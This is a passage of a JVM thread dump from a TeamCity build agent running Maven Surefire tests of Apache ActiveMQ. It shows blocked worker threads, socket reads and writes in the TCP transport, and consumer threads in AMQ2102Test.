org.apache.maven.surefire.booter.shade.org.codehaus.plexus.util.cli.StreamConsumer, org.apache.maven.surefire.booter.shade.org.codehaus.plexus.util.cli.StreamConsumer, int) @bci=121, line=146 (Interpreted frame) - org.apache.maven.surefire.booter.shade.org.codehaus.plexus.util.cli.CommandLineUtils.executeCommandLine(org.apache.maven.surefire.booter.shade.org.codehaus.plexus.util.cli.Commandline, org.apache.maven.surefire.booter.shade.org.codehaus.plexus.util.cli.StreamConsumer, org.apache.maven.surefire.booter.shade.org.codehaus.plexus.util.cli.StreamConsumer, int) @bci=5, line=98 (Interpreted frame) - org.apache.maven.surefire.booter.SurefireBooter.fork(java.util.Properties, boolean, boolean) @bci=241, line=673 (Interpreted frame) - org.apache.maven.surefire.booter.SurefireBooter.forkSuite(java.lang.Object[], java.lang.Object, boolean, boolean, java.util.Properties) @bci=35, line=493 (Interpreted frame) - org.apache.maven.surefire.booter.SurefireBooter.runSuitesForkPerTestSet() @bci=168, line=412 (Interpreted frame) - org.apache.maven.surefire.booter.SurefireBooter.run() @bci=62, line=249 (Interpreted frame) - org.apache.maven.plugin.surefire.SurefirePlugin.execute() @bci=44, line=537 (Interpreted frame) - org.apache.maven.plugin.DefaultPluginManager.executeMojo(org.apache.maven.project.MavenProject, org.apache.maven.plugin.MojoExecution, org.apache.maven.execution.MavenSession) @bci=412, line=483 (Interpreted frame) - org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoals(java.util.List, java.util.Stack, org.apache.maven.execution.MavenSession, org.apache.maven.project.MavenProject) @bci=503, line=678 (Interpreted frame) - org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalWithLifecycle(java.lang.String, java.util.Stack, org.apache.maven.execution.MavenSession, java.util.Map, org.apache.maven.project.MavenProject, org.apache.maven.lifecycle.Lifecycle) @bci=28, line=540 (Interpreted frame) - org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoal(java.lang.String, org.apache.maven.execution.MavenSession, org.apache.maven.project.MavenProject) @bci=50, line=519 (Interpreted frame) - org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalAndHandleFailures(java.lang.String, org.apache.maven.execution.MavenSession, org.apache.maven.project.MavenProject, org.apache.maven.monitor.event.EventDispatcher, java.lang.String, org.apache.maven.execution.ReactorManager, long, java.lang.String) @bci=4, line=371 (Interpreted frame) - org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeTaskSegments(java.util.List, org.apache.maven.execution.ReactorManager, org.apache.maven.execution.MavenSession, org.apache.maven.project.MavenProject, org.apache.maven.monitor.event.EventDispatcher) @bci=584, line=332 (Interpreted frame) - org.apache.maven.lifecycle.DefaultLifecycleExecutor.execute(org.apache.maven.execution.MavenSession, org.apache.maven.execution.ReactorManager, org.apache.maven.monitor.event.EventDispatcher) @bci=241, line=181 (Interpreted frame) - org.apache.maven.DefaultMaven.doExecute(org.apache.maven.execution.MavenExecutionRequest, org.apache.maven.monitor.event.EventDispatcher) @bci=474, line=356 (Interpreted frame) - org.apache.maven.DefaultMaven.execute(org.apache.maven.execution.MavenExecutionRequest) @bci=26, line=137 (Interpreted frame) - org.apache.maven.cli.MavenCli.main(java.lang.String[], org.codehaus.classworlds.ClassWorld) @bci=880, line=356 (Interpreted frame) - sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) @bci=0 (Interpreted frame) - sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) @bci=87, line=39 (Interpreted frame) - sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) @bci=6, line=25 (Interpreted frame) - java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object[]) @bci=111, line=585 (Interpreted frame) - org.codehaus.classworlds.Launcher.launchEnhanced(java.lang.String[]) @bci=50, line=315 (Interpreted frame) - org.codehaus.classworlds.Launcher.launch(java.lang.String[]) @bci=2, line=255 (Interpreted frame) - org.codehaus.classworlds.Launcher.mainWithExitCode(java.lang.String[]) @bci=99, line=430 (Interpreted frame) - org.codehaus.classworlds.Launcher.main(java.lang.String[]) @bci=1, line=375 (Interpreted frame)Process ID (PID): 7579Process command line/bin/sh -c cd /x1/TeamCity/buildAgent/work/754220c26babe87e/activemq-fuse-trunkFailed to get thread dump for non-java processProcess ID (PID): 7580Process command line/opt/tools/pfm/jdk/jre/bin/java -Xmx512M -jar /x1/TeamCity/buildAgent/temp/builThread t@3341: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.parkNanos(long) @bci=11, line=146 (Compiled frame) - java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireNanos(int, long) @bci=25, line=1122 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor.getTask() @bci=77, line=475 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@3340: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.parkNanos(long) @bci=11, line=146 (Compiled frame) - java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireNanos(int, long) @bci=25, line=1122 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor.getTask() @bci=77, line=475 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@3339: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.parkNanos(long) @bci=11, line=146 (Compiled frame) - java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireNanos(int, long) @bci=25, line=1122 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor.getTask() @bci=77, line=475 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@3338: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.parkNanos(long) @bci=11, line=146 (Compiled frame) - java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireNanos(int, long) @bci=25, line=1122 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor.getTask() @bci=77, line=475 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@3337: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.parkNanos(long) @bci=11, line=146 (Compiled frame) - java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireNanos(int, long) @bci=25, line=1122 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor.getTask() @bci=77, line=475 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@384: (state = IN_NATIVE) - java.net.SocketOutputStream.socketWrite0(java.io.FileDescriptor, byte[], int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketOutputStream.socketWrite(byte[], int, int) @bci=44, line=92 (Compiled frame) - java.io.DataOutputStream.flush() @bci=4, line=106 (Compiled frame) - org.apache.activemq.transport.InactivityMonitor$3.run() @bci=31, line=139 (Interpreted frame) - java.util.concurrent.ThreadPoolExecutor$Worker.runTask(java.lang.Runnable) @bci=44, line=650 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=28, line=675 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@343: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.park() @bci=5, line=118 (Compiled frame) - java.util.concurrent.LinkedBlockingQueue.take() @bci=29, line=359 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@342: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.park() @bci=5, line=118 (Compiled frame) - java.util.concurrent.LinkedBlockingQueue.take() @bci=29, line=359 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@326: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.park() @bci=5, line=118 (Compiled frame) - java.util.concurrent.ArrayBlockingQueue.take() @bci=20, line=341 (Compiled frame) - org.apache.activemq.transport.FutureResponse.getResult() @bci=4, line=40 (Compiled frame) - org.apache.activemq.ActiveMQConnection.syncSendPacket(org.apache.activemq.command.Command) @bci=20, line=1244 (Compiled frame) - org.apache.activemq.TransactionContext.commit() @bci=124, line=282 (Compiled frame) - org.apache.activemq.ActiveMQSession.commit() @bci=76, line=510 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Producer$1.onMessage(javax.jms.Message) @bci=132, line=358 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.dispatch(org.apache.activemq.command.MessageDispatch) @bci=245, line=1080 (Compiled frame) - org.apache.activemq.ActiveMQSessionExecutor.dispatch(org.apache.activemq.command.MessageDispatch) @bci=50, line=127 (Compiled frame) - org.apache.activemq.thread.PooledTaskRunner.runTask() @bci=65, line=122 (Compiled frame) - org.apache.activemq.thread.PooledTaskRunner$1.run() @bci=15, line=43 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.runTask(java.lang.Runnable) @bci=44, line=650 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=28, line=675 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@313: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.park() @bci=5, line=118 (Compiled frame) - java.util.concurrent.LinkedBlockingQueue.take() @bci=29, line=359 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@312: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.park() @bci=5, line=118 (Compiled frame) - java.util.concurrent.LinkedBlockingQueue.take() @bci=29, line=359 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@311: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.park() @bci=5, line=118 (Compiled frame) - java.util.concurrent.LinkedBlockingQueue.take() @bci=29, line=359 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@308: (state = BLOCKED) - org.apache.activemq.transport.InactivityMonitor.oneway(java.lang.Object) @bci=6, line=224 (Compiled frame; information may be imprecise) - org.apache.activemq.transport.TransportFilter.oneway(java.lang.Object) @bci=5, line=83 (Compiled frame) - org.apache.activemq.transport.MutexTransport.oneway(java.lang.Object) @bci=12, line=40 (Compiled frame) - org.apache.activemq.broker.TransportConnection.dispatchSync(org.apache.activemq.command.Command) @bci=2, line=759 (Compiled frame) - org.apache.activemq.transport.TransportFilter.onCommand(java.lang.Object) @bci=5, line=68 (Compiled frame) - org.apache.activemq.transport.InactivityMonitor.onCommand(java.lang.Object) @bci=129, line=210 (Compiled frame) - org.apache.activemq.transport.TransportSupport.doConsume(java.lang.Object) @bci=16, line=84 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.doRun() @bci=7, line=203 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@307: (state = IN_NATIVE) - java.net.SocketOutputStream.socketWrite0(java.io.FileDescriptor, byte[], int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketOutputStream.socketWrite(byte[], int, int) @bci=44, line=92 (Compiled frame) - java.io.DataOutputStream.flush() @bci=4, line=106 (Compiled frame) - org.apache.activemq.transport.InactivityMonitor.onCommand(java.lang.Object) @bci=45, line=189 (Compiled frame) - org.apache.activemq.transport.TransportSupport.doConsume(java.lang.Object) @bci=16, line=84 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.doRun() @bci=7, line=203 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@295: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.park() @bci=5, line=118 (Compiled frame) - java.util.concurrent.LinkedBlockingQueue.take() @bci=29, line=359 (Compiled frame) - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=18, line=674 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@294: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@293: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@291: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@289: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@287: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@284: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@282: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@280: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@278: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@275: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@272: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@271: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@270: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@269: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@268: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@267: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@266: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@265: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@264: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@263: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@252: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@251: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@250: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 